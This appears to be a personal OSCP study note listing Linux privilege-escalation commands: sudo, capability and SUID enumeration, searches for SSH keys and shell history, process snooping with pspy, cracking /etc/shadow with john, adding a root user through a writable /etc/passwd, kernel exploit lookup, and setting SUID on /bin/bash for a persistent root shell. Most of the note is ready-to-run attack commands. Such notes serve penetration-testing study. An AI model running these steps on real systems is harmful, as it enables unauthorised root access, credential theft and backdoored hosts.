### Methodology

#### User and groups
```
whoami
```

Binary permissions 
[https://gtfobins.github.io/](https://gtfobins.github.io/)
```
#sudoers
sudo -l

#capabilities
/usr/sbin/getcap -r / 2>/dev/null

#suid and guid
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
#### Searching for Secrets
```
#Known files and variables
env
bashrc + bash_history

#SSH Keys
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

#### Locally running services
These can be forwarded [here](obsidian://open?vault=Offensive-Security&file=OSCP%2FPost%20Exploitation%2FTunneling)
```
ss -ntplu
sockstat -l
netstat -an
```

#### Interesting Directories
-  \/tmp
-  \/var
-  \/opt
-  \/home

#### Processes (https://github.com/DominicBreuker/pspy)

```
#Only prints system commands.
./psspy64 -p -i 1000

#Prints system commands and events.
./pspy64 -pf -i 1000

#Looking for root processes
ps aux | grep "^root"
watch -n 1 "ps -aux | grep pass"
```

#### Automation

```
./linpeas.sh
```


#### Weak File Permissions

```
#Readable /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

#Writable /etc/passwd
#Generate new SHA hash on local machine and write that in replace of the root one:
mkpasswd -m sha-512 <new-password>

#Don't forget to escape $
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

#### Kernel Exploits

```
uname -a 
cat /etc/issue
searchsploit linux kernel <version> priv esc

#Linux Exploit Suggester
linuxexploitsuggest.pl -k <version>

#GCC to Compile Exploits
`gcc <file.c> -o <exploit>`
```


```
#Alternate way to get root rather then using a reverse shell.
chmod +s /bin/bash
/bin/bash -p
```